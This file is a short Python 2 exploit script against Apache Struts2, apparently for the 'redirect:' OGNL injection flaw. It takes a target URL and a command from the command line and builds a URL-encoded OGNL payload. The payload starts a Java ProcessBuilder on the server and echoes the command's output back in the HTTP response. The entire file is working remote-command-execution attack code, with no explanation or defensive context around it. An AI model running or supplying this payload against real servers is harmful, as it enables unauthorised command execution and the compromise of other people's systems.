import urllib2,sys,re

def get(url, data):
	string = url + "?" + data
	req = urllib2.Request("%s"%string)
	response = urllib2.urlopen(req).read().strip()
	print strip(response)

def strip(str):
   tmp = str.strip()
   blank_line=re.compile('\x00')
   tmp=blank_line.sub('',tmp)
   return tmp

if __name__ == '__main__':
	url = sys.argv[1]
	cmd = sys.argv[2]
	cmd1 = sys.argv[3]
	attack="redirect:${%%23a%%3d(new%%20java.lang.ProcessBuilder(new%%20java.lang.String[]{'%s','%s'})).start(),%%23b%%3d%%23a.getInputStream(),%%23c%%3dnew%%20java.io.InputStreamReader(%%23b),%%23d%%3dnew%%20java.io.BufferedReader(%%23c),%%23e%%3dnew%%20char[50000],%%23d.read(%%23e),%%23matt%%3d%%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%%23matt.getWriter().println(%%23e),%%23matt.getWriter().flush(),%%23matt.getWriter().close()}"%(cmd,cmd1)
	get(url,attack)

